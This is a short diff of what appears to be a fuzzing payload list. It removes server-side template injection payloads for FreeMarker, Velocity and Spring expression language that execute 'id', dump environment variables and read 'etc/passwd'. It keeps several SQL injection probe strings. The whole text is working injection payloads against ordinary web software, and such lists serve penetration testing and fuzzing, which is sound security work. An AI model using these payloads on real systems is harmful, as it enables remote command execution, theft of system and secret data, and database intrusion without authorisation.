@@ -1,8 +1,3 @@
-<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
-$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
-*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
-${T(java.lang.System).getenv()}
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 11||(case+when+(1=1)+then+1+end)
 11||(case+when+(1=1)+then+1+end),NULL--
 ',select(current_users),--
